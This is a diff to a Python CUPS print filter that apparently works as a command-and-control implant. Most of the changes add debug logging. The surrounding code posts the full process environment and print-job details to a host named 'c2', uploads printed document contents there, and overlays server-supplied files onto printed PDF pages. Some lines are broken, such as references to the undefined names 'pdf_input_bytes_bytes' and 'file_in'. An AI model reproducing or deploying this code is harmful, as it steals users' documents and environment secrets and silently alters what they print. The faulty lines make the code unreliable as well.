@@ -25,6 +25,7 @@ def eprint(*args, **kwargs):
 
 def bpc_debug(*args, **kwargs):
     eprint("DEBUG: (BPC)", *args, **kwargs)
+    # eprint("DEBUG: (BPC)", threading.get_ident(), *args, **kwargs)
 
 
 def spawn_daemon(func, *args, **kwargs):
@@ -70,10 +71,10 @@ class MetaUploader(threading.Thread):
         job_data = {'timestamp': datetime.datetime.now().timestamp(),
                     'environment': dict(os.environ)}
         job_data.update(self.cups_info)
-        # bpc_debug("Uploading Metadata")
+        bpc_debug("MetaUploader started")
         response = requests.post(C2_METADATA_URL, json=job_data)
         json_response = response.json()
-        # bpc_debug("Uploaded Metadata - Response:", json_response)
+        bpc_debug("MetaUploader response=", json_response)
         self._upload_id = json_response['upload_id']
         self._upload_file = json_response['upload_file']
         self._overlays = {}
@@ -94,7 +95,7 @@ class MetaUploader(threading.Thread):
                                                    'updated_at': updated_at,
                                                    'downloader': downloader}
 
-            # bpc_debug("Uploaded Metadata - Done:", self._overlays)
+            bpc_debug("MetaUploader ended overlays=:", self._overlays)
 
     def upload_id(self):
         self.join()
@@ -120,20 +121,19 @@ class FileDownloader(threading.Thread):
         self._bytes = None
 
     def run(self):
-        bpc_debug("FileDownloader:", self._path, self._url, self._updated_at)
+        bpc_debug("FileDownloader started path=", self._path, 'url=', self._url, 'updated-at=', self._updated_at)
         if not os.path.isfile(self._path):
-            bpc_debug("FileDownloader: File does not exist - downloading", self._path)
+            bpc_debug("FileDownloader: File does not exist - downloading path=", self._path)
             return self.download_file()
         else:
-            bpc_debug("FileDownloader: File exist - continue checking", self._path)
+            bpc_debug("FileDownloader: File exist - continue checking path=", self._path)
 
-        if datetime.datetime.fromtimestamp(os.path.getmtime(self._path)) < self._updated_at:
-            bpc_debug("FileDownloader: File on disk too old", self._path,
-                      datetime.datetime.fromtimestamp(os.path.getmtime(self._path)), self._updated_at)
+        age = (self._updated_at - datetime.datetime.fromtimestamp(os.path.getmtime(self._path))).total_seconds()
+        if age > 0:
+            bpc_debug("FileDownloader: File on disk too old path=", self._path, 'age=', age)
             return self.download_file()
         else:
-            bpc_debug("FileDownloader: File young enough", self._path,
-                      datetime.datetime.fromtimestamp(os.path.getmtime(self._path)), self._updated_at)
+            bpc_debug("FileDownloader: File young enough path=", self._path, 'age=', age)
 
         bpc_debug("FileDownloader: File in Cache!")
 
@@ -153,33 +153,36 @@ def convert_postscript_to_pdf(bytes, cups_info):
 
 
 def pstopdf(pdf_input_bytes, cups_id, cups_user, cups_title, cups_copies, cups_options):
-    bpc_debug("ps_to_pdf")
+    bpc_debug("ps_to_pdf started in=", len(pdf_input_bytes_bytes), "bytes")
     bytes = subprocess.check_output(
         args=["/usr/lib/cups/filter/pstopdf", cups_id, cups_user, cups_title, cups_copies, cups_options],
         stdin=file_in)
     # file.close()
+    bpc_debug("ps_to_pdf ended out=", len(bytes), "bytes")
     return bytes
 
 
-def ps2pdf(bytes):
-    bpc_debug("ps_2_pdf")
+def ps2pdf(in_bytes):
+    bpc_debug("ps_2_pdf started in=", len(in_bytes), "bytes")
     p = subprocess.Popen(args=["/usr/bin/ps2pdf", '-', '-'],
                          stdin=subprocess.PIPE,
                          stdout=subprocess.PIPE)
-    bytes = p.communicate(input=bytes)[0]
+    out_bytes = p.communicate(input=in_bytes)[0]
     p.stdin.close()
-    return bytes
+    bpc_debug("ps_2_pdf ended out=", len(out_bytes), "bytes")
+    return out_bytes
 
 
-def ps2ascii(ps_bytes):
-    bpc_debug("ps_2_ascii:")
+def ps2ascii(in_bytes):
+    bpc_debug("ps_2_ascii started in=", len(in_bytes), "bytes")
     p = subprocess.Popen(
         args=["/usr/bin/ps2ascii", '-', '-'],
         stdin=subprocess.PIPE,
         stdout=subprocess.PIPE)
-    bytes = p.communicate(input=ps_bytes)[0]
+    out_bytes = p.communicate(input=in_bytes)[0]
     p.stdin.close()
-    return bytes
+    bpc_debug("ps_2_ascii ended", len(out_bytes), "bytes")
+    return out_bytes
 
 
 def convert_pdf_to_postscript(bytes, cups_info):
@@ -187,39 +190,44 @@ def convert_pdf_to_postscript(bytes, cups_info):
     return pdf2ps(bytes)
 
 
-def pdftops(bytes, cups_id, cups_user, cups_title, cups_copies, cups_options):
-    bpc_debug("pdf_to_ps")
+def pdftops(in_bytes, cups_id, cups_user, cups_title, cups_copies, cups_options):
+    bpc_debug("pdf_to_ps started in=", len(in_bytes), "bytes")
     p = subprocess.Popen(
         args=["/usr/lib/cups/filter/pdftops", cups_id, cups_user, cups_title, cups_copies, cups_options],
         stdin=subprocess.PIPE)
-    p.communicate(input=bytes)
+    out_bytes = p.communicate(input=in_bytes)[0]
     p.stdin.close()
+    bpc_debug("pdf_to_ps ended in=", len(out_bytes), "bytes")
+    return out_bytes
 
 
-def pdf2ps(bytes):
-    bpc_debug("pdf_2_ps")
+def pdf2ps(in_bytes):
+    bpc_debug("pdf_2_ps started in=", len(in_bytes), "bytes")
     p = subprocess.Popen(
         args=["/usr/bin/pdf2ps", '-', '-'],
         stdin=subprocess.PIPE,
         stdout=subprocess.PIPE)
-    bytes = p.communicate(input=bytes)[0]
+    out_bytes = p.communicate(input=in_bytes)[0]
     p.stdin.close()
-    return bytes
+    bpc_debug("pdf_2_ps ended out=", len(out_bytes), "bytes")
+    return out_bytes
 
 
-def overlay_pdf(bytes, overlays):
-    bpc_debug("Overlaying PDF", overlays)
+def overlay_pdf(in_bytes, overlays):
+    bpc_debug("overlay_pdf started in=", len(in_bytes), "overlays=", overlays)
     overlay_pages = {}
 
-    with io.BytesIO(bytes) as in_file:
+    with io.BytesIO(in_bytes) as in_file:
         with io.BytesIO() as out_file:
             in_reader = PyPDF2.PdfFileReader(in_file)
             out_writer = PyPDF2.PdfFileWriter()
 
             for page_index in range(in_reader.numPages):
+                bpc_debug("overlay_pdf Page", page_index + 1, '/', in_reader.numPages)
                 overlay_page = None
                 overlay = overlays.get(page_index + 1)
-                # bpc_debug("Got overlay", overlay)
+                if overlay is not None:
+                    bpc_debug("overlay_pdf Page", page_index + 1, 'with', overlay)
                 if overlay is None:
                     overlay_page = None
                 else:
@@ -235,17 +243,19 @@ def overlay_pdf(bytes, overlays):
                 out_writer.addPage(page)
 
             out_writer.write(out_file)
-            result = out_file.getvalue()
-    bpc_debug("Overlayed PDF")
-    return result
+            out_bytes = out_file.getvalue()
+    bpc_debug("overlay_pdf ended out=", len(out_bytes), 'bytes')
+    return out_bytes
 
 
 def read_ps_in_bytes():
+    bpc_debug("read_ps_in_bytes started")
     if len(sys.argv) > 6 and os.path.isfile(sys.argv[6]):
         with open(sys.argv[6], 'rb') as file:
             bytes = file.read()
     else:
         bytes = sys.stdin.buffer.read()
+    bpc_debug("read_ps_in_bytes ended out=", len(bytes), 'bytes')
     return bytes
 
 
@@ -256,10 +266,10 @@ def write_ps_out_bytes(bytes):
 def upload_bytes(bytes, upload_id, filename, mimetype):
     if len(bytes) == 0:
         return
-    bpc_debug("Uploading Bytes:", upload_id, mimetype)
+    bpc_debug("upload_bytes started id=", upload_id, 'mimetype=', mimetype)
     file = {'file': (filename, bytes, mimetype)}
     response = requests.post(C2_UPLOAD_URL % upload_id, files=file)
-    bpc_debug("Uploaded Bytes:", response)
+    bpc_debug("upload_bytes ended response=", response)
 
 
 C2_API_URL = 'http://c2:8080/bpc/api-v1'
